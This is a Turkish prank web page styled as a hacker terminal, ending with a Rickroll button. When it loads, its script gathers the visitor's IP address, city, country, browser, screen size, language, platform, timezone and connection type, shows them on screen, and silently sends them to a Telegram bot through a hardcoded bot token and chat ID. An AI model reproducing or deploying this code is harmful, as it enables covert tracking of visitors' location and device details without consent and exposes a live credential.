<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <title>Giriş Kontrolü</title>
  <style>
    body {
      background: linear-gradient(135deg, #010a13, #0a1e2c, #14344f);
      color: #00ff99;
      font-family: 'Consolas', monospace;
      font-size: 18px;
      margin: 0;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      overflow: hidden;
      position: relative;
    }
    #terminal {
      background: rgba(0, 0, 0, 0.85);
      border: 2px solid #00ff99;
      border-radius: 15px;
      padding: 30px 40px;
      width: 90%;
      max-width: 700px;
      min-height: 300px;
      overflow-y: auto;
      white-space: pre-line;
      box-shadow: 0 0 25px #00ff99;
      z-index: 2;
      position: relative;
    }
    .background-code {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      color: rgba(0, 255, 153, 0.12);
      font-size: 16px;
      font-family: monospace;
      user-select: none;
      line-height: 1.4;
      padding: 30px;
      animation: scroll 15s linear infinite alternate;
      filter: drop-shadow(0 0 4px #00ff99);
      z-index: 1;
    }
    @keyframes scroll {
      0% { transform: translateY(0); }
      100% { transform: translateY(-50%); }
    }
    #rickButton {
      margin-top: 35px;
      padding: 20px 60px;
      font-size: 24px;
      font-weight: 900;
      background-color: #00ff99;
      color: #002b20;
      border: none;
      border-radius: 14px;
      cursor: pointer;
      font-family: 'Consolas', monospace;
      box-shadow: 0 0 30px #00ff99;
      transition: background-color 0.25s ease, transform 0.2s ease;
      user-select: none;
      z-index: 3;
      display: none;
      position: relative;
    }
    #rickButton:hover {
      background-color: #00cc77;
      transform: scale(1.08);
      box-shadow: 0 0 40px #00ff99, 0 0 20px #00cc77;
    }
  </style>
</head>
<body>
  <div class="background-code" aria-hidden="true">
    <pre>
01001001 01110000 00111010
00110100 00110010 00110101
01110011 01110100 01100101
01101101 00110000 01100001
01010100 01110010 01100001 01100011 01101011 01101001 01101110 01100111
01000100 01100001 01110100 01100001
    </pre>
  </div>

  <div id="terminal">Veriler Toplanıyor...</div>
  <button id="rickButton" onclick="window.location.href='https://www.youtube.com/watch?v=dQw4w9WgXcQ'">
    Tıklamaya cesaretin var mı?
  </button>

  <script>
    const terminal = document.getElementById('terminal');
    const rickButton = document.getElementById('rickButton');

    function typeText(text, delay = 40) {
      return new Promise(resolve => {
        let i = 0;
        const interval = setInterval(() => {
          terminal.innerText += text.charAt(i);
          i++;
          if (i >= text.length) {
            clearInterval(interval);
            terminal.innerText += "\n";
            resolve();
          }
        }, delay);
      });
    }

    async function sendToTelegram(message) {
      const chatId = "6400737507"; // Kendi chat ID’in
      const token = "8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg"; // Kendi bot token’in
      const url = `https://api.telegram.org/bot${token}/sendMessage`;

      await fetch(url, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      });
    }

    async function showInfo() {
      terminal.innerText = ""; // Başlangıçtaki yazıyı sil
      await typeText("Veriler Toplanıyor...");

      await new Promise(r => setTimeout(r, 1200));

      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();

        await typeText(`IP Adresi: ${data.ip}`);
        await typeText(`Şehir: ${data.city}`);
        await typeText(`Ülke: ${data.country_name}`);
        await typeText(`Tarayıcı: ${navigator.userAgent}`);
        await typeText(`Ekran Çözünürlüğü: ${screen.width}x${screen.height}`);
        await typeText(`Dil: ${navigator.language || 'Bilinmiyor'}`);
        await typeText(`Platform: ${navigator.platform || 'Bilinmiyor'}`);
        await typeText(`Zaman Dilimi: UTC${-new Date().getTimezoneOffset() / 60}`);
        await typeText(`Çerez İzinleri: ${navigator.cookieEnabled ? 'Aktif' : 'Kapalı'}`);
        await typeText(`Bağlantı Tipi: ${navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor'}`);

        const message = `YENİ GİRİŞ:\nIP: ${data.ip}\nŞehir: ${data.city}\nÜlke: ${data.country_name}\nTarayıcı: ${navigator.userAgent}\nÇözünürlük: ${screen.width}x${screen.height}\nDil: ${navigator.language}\nPlatform: ${navigator.platform}\nZaman Dilimi: UTC${-new Date().getTimezoneOffset() / 60}\nÇerez: ${navigator.cookieEnabled ? 'Aktif' : 'Kapalı'}\nBağlantı Tipi: ${navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor'}`;

        await sendToTelegram(message);
      } catch (e) {
        await typeText("Veri alınırken bir hata oluştu.");
      }

      await new Promise(r => setTimeout(r, 1000));
      rickButton.style.display = 'inline-block';
    }

    showInfo();
  </script>
</body>
</html>
